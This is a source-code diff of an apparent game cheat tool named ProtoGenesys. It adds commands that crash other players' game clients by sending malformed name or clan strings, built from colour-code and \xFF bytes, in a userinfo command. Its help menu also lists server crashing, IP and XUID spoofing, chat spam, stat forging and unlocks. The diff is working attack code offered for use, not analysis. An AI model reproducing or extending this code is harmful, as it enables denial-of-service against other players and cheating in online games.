@@ -30,7 +30,8 @@ namespace ProtoGenesys
 			vCommands.push_back(VariadicText("%s_clear", PROGRAM_CMD_PREFIX));
 			vCommands.push_back(VariadicText("%s_history", PROGRAM_CMD_PREFIX));
 			vCommands.push_back(VariadicText("%s_quit", PROGRAM_CMD_PREFIX));
-			vCommands.push_back(VariadicText("%s_crashclient", PROGRAM_CMD_PREFIX));
+			vCommands.push_back(VariadicText("%s_crashname", PROGRAM_CMD_PREFIX));
+			vCommands.push_back(VariadicText("%s_crashclan", PROGRAM_CMD_PREFIX));
 			vCommands.push_back(VariadicText("%s_crashserver", PROGRAM_CMD_PREFIX));
 			vCommands.push_back(VariadicText("%s_endround", PROGRAM_CMD_PREFIX));
 			vCommands.push_back(VariadicText("%s_name", PROGRAM_CMD_PREFIX));
@@ -94,22 +95,23 @@ namespace ProtoGenesys
 
 		if (ImGui::Button("Help", ImVec2(50, 0)))
 		{
-			AddLog("1. %s_crashclient\n\t\tCrash clients in the lobby.", PROGRAM_CMD_PREFIX);
-			AddLog("2. %s_crashserver\n\t\tCrash the current server.", PROGRAM_CMD_PREFIX);
-			AddLog("3. %s_endround\n\t\tEnd the current round.", PROGRAM_CMD_PREFIX);
-			AddLog("4. %s_name <on|off> <name>\n\t\tChange your name.", PROGRAM_CMD_PREFIX);
-			AddLog("5. %s_clan <on|off> <clan>\n\t\tChange your clan.", PROGRAM_CMD_PREFIX);
-			AddLog("6. %s_xuid <on|off> <xuid>\n\t\tChange your xuid.", PROGRAM_CMD_PREFIX);
-			AddLog("7. %s_ip <on|off> <ip>\n\t\tChange your ip.", PROGRAM_CMD_PREFIX);
-			AddLog("8. %s_killspam <on|off> <message>\n\t\tSet killspam message.", PROGRAM_CMD_PREFIX);
-			AddLog("9. %s_votespam <on|off> <message>\n\t\tSet votespam message.", PROGRAM_CMD_PREFIX);
-			AddLog("10. %s_experience <max|experience>\n\t\tSet your experience.", PROGRAM_CMD_PREFIX);
-			AddLog("11. %s_prestige <max|prestige>\n\t\tSet your prestige.", PROGRAM_CMD_PREFIX);
-			AddLog("12. %s_unlockall\n\t\tUnlock everything in the game.", PROGRAM_CMD_PREFIX);
-			AddLog("13. %s_uploadstats\n\t\tCalculate hash for and sign your stats.", PROGRAM_CMD_PREFIX);
-			AddLog("14. %s_resetstats\n\t\tReset your save data.", PROGRAM_CMD_PREFIX);
-			AddLog("15. %s_connect <xuid>\n\t\tConnect to a specific player.", PROGRAM_CMD_PREFIX);
-			AddLog("16. %s_disconnect\n\t\tDisconnect from the current server.", PROGRAM_CMD_PREFIX);
+			AddLog("1. %s_crashname\n\t\tCrash clients with your name.", PROGRAM_CMD_PREFIX);
+			AddLog("2. %s_crashclan\n\t\tCrash clients with your clan.", PROGRAM_CMD_PREFIX);
+			AddLog("3. %s_crashserver\n\t\tCrash the current server.", PROGRAM_CMD_PREFIX);
+			AddLog("4. %s_endround\n\t\tEnd the current round.", PROGRAM_CMD_PREFIX);
+			AddLog("5. %s_name <on|off> <name>\n\t\tChange your name.", PROGRAM_CMD_PREFIX);
+			AddLog("6. %s_clan <on|off> <clan>\n\t\tChange your clan.", PROGRAM_CMD_PREFIX);
+			AddLog("7. %s_xuid <on|off> <xuid>\n\t\tChange your xuid.", PROGRAM_CMD_PREFIX);
+			AddLog("8. %s_ip <on|off> <ip>\n\t\tChange your ip.", PROGRAM_CMD_PREFIX);
+			AddLog("9. %s_killspam <on|off> <message>\n\t\tSet killspam message.", PROGRAM_CMD_PREFIX);
+			AddLog("10. %s_votespam <on|off> <message>\n\t\tSet votespam message.", PROGRAM_CMD_PREFIX);
+			AddLog("11. %s_experience <max|experience>\n\t\tSet your experience.", PROGRAM_CMD_PREFIX);
+			AddLog("12. %s_prestige <max|prestige>\n\t\tSet your prestige.", PROGRAM_CMD_PREFIX);
+			AddLog("13. %s_unlockall\n\t\tUnlock everything in the game.", PROGRAM_CMD_PREFIX);
+			AddLog("14. %s_uploadstats\n\t\tCalculate hash for and sign your stats.", PROGRAM_CMD_PREFIX);
+			AddLog("15. %s_resetstats\n\t\tReset your save data.", PROGRAM_CMD_PREFIX);
+			AddLog("16. %s_connect <xuid>\n\t\tConnect to a specific player.", PROGRAM_CMD_PREFIX);
+			AddLog("17. %s_disconnect\n\t\tDisconnect from the current server.", PROGRAM_CMD_PREFIX);
 
 			_mainGui.bWriteLog = true;
 		} ImGui::SameLine();
@@ -256,16 +258,35 @@ namespace ProtoGenesys
 			exit(EXIT_SUCCESS);
 		}
 
-		else if (!Stricmp(CmdLine.szCmdName, VariadicText("%s_crashclient", PROGRAM_CMD_PREFIX)))
+		else if (!Stricmp(CmdLine.szCmdName, VariadicText("%s_crashname", PROGRAM_CMD_PREFIX)))
 		{
 			AddLog("%s executing.", acut::ToLower(CmdLine.szCmdName).c_str());
 
 			std::random_device rd;
 			std::uniform_int_distribution<int> dist(0x48, 0x49);
 
-			std::string szRandomCrashString(VariadicText("^%c%s", (char)dist(rd), acut::RandomANString(5).c_str()));
+			_profiler.gNameOverRide->Current.szValue = Strdup(VariadicText("^%c\xFF\xFF\xFF", (char)dist(rd)));
 
-			_profiler.gClanOverRide->Current.szValue = Strdup(szRandomCrashString.c_str());
+			std::string szNameOverride(_profiler.gNameOverRide->Current.szValue);
+			std::string szClanOverride(_profiler.gClanOverRide->Current.szValue);
+			std::string szXuidOverride(_profiler.gXuidOverRide->Current.szValue);
+
+			AddReliableCommand(VariadicText("userinfo \"\\name\\%s\\clanAbbrev\\%s\\xuid\\%s\"",
+				szNameOverride.empty() ? GetUsername() : szNameOverride.c_str(),
+				szClanOverride.empty() ? GetClantag() : szClanOverride.c_str(),
+				szXuidOverride.empty() ? GetXuidstring() : szXuidOverride.c_str()));
+
+			AddLog("%s executed.", acut::ToLower(CmdLine.szCmdName).c_str());
+		}
+
+		else if (!Stricmp(CmdLine.szCmdName, VariadicText("%s_crashclan", PROGRAM_CMD_PREFIX)))
+		{
+			AddLog("%s executing.", acut::ToLower(CmdLine.szCmdName).c_str());
+
+			std::random_device rd;
+			std::uniform_int_distribution<int> dist(0x48, 0x49);
+
+			_profiler.gClanOverRide->Current.szValue = Strdup(VariadicText("^%c%s", (char)dist(rd), acut::RandomANString(5).c_str()));
 
 			std::string szNameOverride(_profiler.gNameOverRide->Current.szValue);
 			std::string szClanOverride(_profiler.gClanOverRide->Current.szValue);
